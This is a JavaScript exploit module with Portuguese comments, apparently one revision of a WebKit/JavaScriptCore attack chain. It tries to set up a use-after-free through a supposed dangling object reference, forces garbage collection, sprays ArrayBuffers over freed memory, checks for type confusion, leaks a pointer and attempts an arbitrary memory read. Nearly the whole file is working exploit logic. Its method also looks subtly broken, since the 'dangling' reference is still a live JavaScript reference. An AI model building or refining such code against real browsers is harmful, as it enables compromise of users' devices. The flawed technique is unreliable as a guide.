// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R56 - GC Domado)
// =======================================================================================
// ESTA VERSÃO SE CONCENTRA EM CORRIGIR O CRASH CAUSADO PELA FUNÇÃO triggerGC_Hyper.
// A lógica do exploit do R55 estava correta, mas nunca era alcançada.
// - A função triggerGC_Hyper foi "domada" para ser menos agressiva, reduzindo o
//   número de alocações e impondo um limite de tamanho para evitar esgotar a memória do sistema.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_read_absolute,
    oob_write_absolute,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Tamed_GC";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R56 - Tamed GC)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: GC Domado (R56) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;
    let spray_buffers = [];
    const SPRAY_BUFFER_SIZE = 136;

    try {
        logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
        await triggerGC_Tamed(); // Nova função de GC, menos agressiva

        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
        dangling_ref = sprayAndCreateDanglingPointer(); 
        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
        
        logS3("--- FASE 3: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
        await triggerGC_Tamed();
        await PAUSE_S3(100);
        await triggerGC_Tamed();
        logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");

        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
        for (let i = 0; i < 1024; i++) {
            const buf = new ArrayBuffer(SPRAY_BUFFER_SIZE); 
            const view = new BigUint64Array(buf);
            view[0] = 0x4141414141414141n;
            view[1] = 0x4242424242424242n;
            spray_buffers.push(buf);
        }
        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída. Verificando a confusão de tipos...`, "info");

        logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");

        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        
        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");

        const leaked_ptr_double = dangling_ref.corrupted_prop;
        const buf_conv = new ArrayBuffer(8);
        (new Float64Array(buf_conv))[0] = leaked_ptr_double;
        const int_view = new Uint32Array(buf_conv);
        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
        
        logS3("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
        
        let corrupted_buffer = null;
        logS3("    Procurando por buffer com byteLength corrompido...", "info");
        for (const buf of spray_buffers) {
            if (buf.byteLength !== SPRAY_BUFFER_SIZE) {
                logS3(`Encontrado buffer corrompido! Tamanho esperado: ${SPRAY_BUFFER_SIZE}, Tamanho encontrado: ${buf.byteLength}`, "good");
                corrupted_buffer = buf;
                break;
            }
        }

        if (!corrupted_buffer) {
            throw new Error("Não foi possível encontrar o buffer corrompido entre os pulverizados (verificação de byteLength).");
        }

        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000");
        dangling_ref.prop_b = int64ToDouble(target_address_to_read);

        const hacked_view = new DataView(corrupted_buffer);
        const read_value = hacked_view.getUint32(0, true); 

        logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
        logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");

        final_result = { 
            success: true, 
            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF!",
            leaked_addr: leaked_addr.toString(true),
            arb_read_test_value: toHex(read_value)
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result,
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success
    };
}


// --- Funções Auxiliares ---

// *** MUDANÇA R56: Função de GC "Domada" (Tamed) ***
async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        // Loop reduzido e tamanho da alocação limitado para evitar crash
        for (let i = 0; i < 500; i++) {
            // Limita cada alocação a um máximo de 1MB
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0)); // Ajustado para evitar alocação excessiva
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Domado, o que é esperado e bom.", "info");
    }
    await PAUSE_S3(500);
}

function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            prop_a: 0x11111111, prop_b: 0x22222222, 
            corrupted_prop: 0.12345,
            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
            p16: 0, p17: 0
        };
        dangling_ref_internal = victim; 
        for(let i=0; i<100; i++) {
            victim.prop_a += 1;
        }
    }
    createScope();
    return dangling_ref_internal;
}
